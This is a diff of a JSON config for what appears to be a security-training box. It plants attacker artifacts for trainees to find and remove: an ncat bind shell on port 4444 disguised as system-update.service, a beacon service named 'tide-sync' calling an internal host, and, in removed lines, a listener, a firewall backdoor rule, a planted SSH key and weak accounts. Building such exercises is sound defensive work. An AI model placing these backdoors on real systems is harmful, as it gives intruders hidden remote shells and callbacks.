@@ -1,94 +1,28 @@
 {
-  "_comment": "Opochtli Landing Port Authority vuln-planting side. Every catalog config referenced here is GENERIC and var-driven (see boxbuilder/vulndb_vuln_configs/) except the two box-agnostic network artifacts -- raw-socket-beacon (compiled binary embedded as base64; source + patch provenance in raw-socket-beacon.c) and backdoor-firewall-rule -- both reusable by any future firewall-themed box. Each FILE_PATH / SERVICE_NAME / USERNAME here MUST match its paired check's collect.path / service / pattern in scenario.yaml exactly -- nothing cross-checks them. The docking-agent python payload (PAYLOAD_PATH /usr/local/libexec/docking-agent) is scored by a process_state regex on the cmdline and binds 0.0.0.0:31337, so its path must stay in sync with scenario.yaml's docking_agent_killed pattern and beacon_port_quiet script. The raw-socket-beacon installs /usr/local/libexec/.cache-refresh (BEACON_PATH default) scored by beacon_killed's pattern -- if you override BEACON_PATH there, update that pattern. cache-prune.service and docking-agent.service are scored by service_state disabled checks, so both plants must be ENABLED (their seeds default to enabled). The beacon deliberately listens on NO port: finding it is a process-review exercise. backdoor-firewall-rule's SOURCE_IP (198.51.100.77, RFC 5737 TEST-NET-2 -- unroutable by design) must match the backdoor_rule_removed script and fq-backdoor-source answer; the beacon's baked C2 (203.0.113.66:8443, TEST-NET-3) must match fq-c2-destination. The planted authorized_keys line carries the harbor-pilot-key comment scored by no_planted_pilot_key and fq-key-comment. harbormaster and its .ssh dir are created during TEMPLATE PREP (before plant), not by a catalog config. Run `nakon catalog check --config nakon.json --json` after the bundled seeds have been ensured in vulndb.",
+  "_comment": "Opochtli Landing v2 plants (Debian 13 CLI box). The box's LEGITIMATE service stack -- harbormaster account (sudo, ~/Desktop for the huitz CLI's report/forensics files), apache2+PHP+MariaDB and the cargo-manifest web app, plus nmap's /usr/bin/ncat that the ncat-listener-autostart unit hardcodes -- is baked in during TEMPLATE PREP, not planted here. This config plants only the attacker material. Couplings that must stay in sync with boxes/opochtli-landing/scenario.yaml (asserted by tests/unit/test_boxbuilder_opochtli_landing.py): tide-sync vars <-> beacon_service_removed/beacon_process_gone/beacon_binary_removed + fq-beacon-destination; ncat-listener-autostart (catalog row: unit system-update.service, ncat -l -k -p 4444 -e /bin/bash, enable-without---now) <-> bind_shell_removed + fq-bind-shell; cockpit-installed <-> cockpit_removed. The ncat unit is enable-only, so a build loop must `systemctl start system-update.service` after plant for the bind shell to be live pre-reboot (clones start it at boot). All plants must stay ENABLED at seal: the paired checks score their absence.",
   "machines": [
     {
       "id": 1,
       "name": "opochtli-landing-01",
       "ip": "REPLACED-BY-PROVIDER",
-      "os": "ubuntu-xfce",
       "user": "REPLACED-BY-PROVIDER",
       "password": "REPLACED-BY-PROVIDER",
+      "os": "debian-13-cli",
       "configurations": [
-        "ufw-removed",
+        "cockpit-installed",
+        "ncat-listener-autostart",
         {
-          "name": "insecure-file-mode",
+          "name": "realm-beacon",
           "vars": {
-            "FILE_PATH": "/opt/harbor/manifests/master-manifest.txt",
-            "FILE_MODE": "0666",
-            "FILE_CONTENT": "OPOCHTLI LANDING -- MASTER CARGO MANIFEST (RESTRICTED)\nBerth 7: MV Coyolxauhqui -- cocoa concentrate, consignee Cocoa Falls Chocolate Works\nBerth 9: MV Ridge Runner -- telescope optics, consignee Coyolxauhqui Ridge Solar Observatory\nBerth 12: MV Halcyon Tide -- mixed general cargo\nDuty pilot rotation and tug schedules on file with the harbormaster.\nDO NOT SHARE outside the pilot office."
+            "SERVICE_NAME": "tide-sync",
+            "BEACON_PATH": "/opt/tide-sync/tide-syncd",
+            "DESCRIPTION": "Tide table sync service",
+            "TARGET_IP": "10.233.0.66",
+            "TARGET_PORT": "8443",
+            "INTERVAL_S": "30",
+            "BEACON_ID": "DISASTEROUS_PHARMACY"
           }
-        },
-        {
-          "name": "insecure-file-mode",
-          "vars": {
-            "FILE_PATH": "/home/harbormaster/.ssh/id_rsa",
-            "FILE_MODE": "0644",
-            "FILE_CONTENT": "-----BEGIN TRAINING PRIVATE KEY-----\nnot-a-real-key\n-----END TRAINING PRIVATE KEY-----"
-          }
-        },
-        {
-          "name": "insecure-file-mode",
-          "vars": {
-            "FILE_PATH": "/home/harbormaster/.ssh/authorized_keys",
-            "FILE_MODE": "0644",
-            "FILE_CONTENT": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlantedTrainingKeyNotARealCredential harbor-pilot-key"
-          }
-        },
-        {
-          "name": "local-user",
-          "vars": {
-            "USERNAME": "stevedore",
-            "PASSWORD": "Dockhand2024!",
-            "GROUPS_ADD": "sudo"
-          }
-        },
-        {
-          "name": "local-user",
-          "vars": {
-            "USERNAME": "nightwatch",
-            "PASSWORD": ""
-          }
-        },
-        {
-          "name": "user-login-shell",
-          "vars": {
-            "USERNAME": "cranelift",
-            "LOGIN_SHELL": "/bin/bash",
-            "SYSTEM": "1"
-          }
-        },
-        {
-          "name": "user-sudo-nopasswd",
-          "vars": {
-            "USERNAME": "harbormaster",
-            "DROPIN_NAME": "00-harbor-nopasswd"
-          }
-        },
-        {
-          "name": "systemd-service",
-          "vars": {
-            "SERVICE_NAME": "docking-agent",
-            "DESCRIPTION": "Docking Assist Agent",
-            "EXEC_START": "/usr/bin/python3 /usr/local/libexec/docking-agent",
-            "PAYLOAD_PATH": "/usr/local/libexec/docking-agent",
-            "PAYLOAD_BODY": "import socket, time\nsrv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsrv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\nsrv.bind((\"0.0.0.0\", 31337))\nsrv.listen(5)\nwhile True:\n    try:\n        conn, _addr = srv.accept()\n        conn.sendall(b\"docking-ok\\n\")\n        conn.close()\n    except Exception:\n        time.sleep(5)"
-          }
-        },
-        {
-          "name": "raw-socket-beacon",
-          "vars": {
-            "SERVICE_NAME": "cache-prune",
-            "DESCRIPTION": "Thumbnail cache maintenance"
-          }
-        },
-        {
-          "name": "backdoor-firewall-rule",
-          "vars": {
-            "SOURCE_IP": "198.51.100.77",
-            "DST_PORT": "22"
-          }
-        },
-        "ssh-root-login"
+        }
       ]
     }
   ]
